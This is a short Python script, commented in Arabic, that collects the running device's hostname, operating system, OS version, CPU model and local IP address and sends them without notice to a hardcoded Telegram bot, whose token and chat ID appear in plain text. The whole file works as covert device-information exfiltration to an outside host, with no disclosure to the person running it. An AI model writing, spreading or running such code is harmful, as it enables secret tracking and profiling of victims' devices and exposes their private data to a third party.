import socket 
import requests
import subprocess
import platform


black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"
version="1.0"




error  =    f"{blue}[{white}!{blue}] {red}"
def get_phone_info():
    # نظام التشغيل على هاتفك (Android أو iOS)
    os_name = platform.system()

    # إصدار نظام التشغيل
    os_version = platform.release()

    # نوع المعالج في هاتفك
    try:
        processor_info = subprocess.check_output(['cat', '/proc/cpuinfo']).decode()
        processor = [line for line in processor_info.split('\n') if 'model name' in line][0].			split(':')[1].strip()
    except:
        processor = "غير معروف"

    # قد تحتاج إلى طرق مختلفة حسب نوع هاتفك ونظام التشغيل للحصول على المزيد من المعلومات

    return os_name, os_version, processor

if __name__ == "__main__":
    phone_os, phone_os_version, phone_processor = get_phone_info()
def get_device_name():
    # الحصول على اسم المضيف (اسم جهاز الكمبيوتر)
    host_name = socket.gethostname()
    
    # الحصول على اسم النظام التشغيل (مثل Windows, Linux, macOS إلخ)
    os_name = platform.system()

    return host_name, os_name

if __name__ == "__main__":
    device_name, os_name = get_device_name()

# إنشاء مأخذ الاتصال
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# ربط مأخذ الاتصال بعنوان IP ورقم المنفذ المطلوبين
try :
  s.connect(('www.google.com', 80))
except :
  print(f"{error}Failed to Connect with Github")
  pass

# الحصول على عنوان IP المستخدم في الاتصال
ip_address = s.getsockname()[0]

# إغلاق مأخذ الاتصال
s.close()


id = ('5589465204')
token = ('6477425694:AAExSQEhdvXQtNPmzavlpnDKSUkC1CFZkRw')


#my website : https://alhelfi.softr.app
telegram_sand = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=user info\nip: {ip_address}\ndevice name : {device_name}\nsystem name : {os_name}\nphone version : {phone_os_version}\nphone prossecor : {phone_processor }')
try :
	req = requests.post(telegram_sand)
except :

	print(f"{error}Connection Error !!")
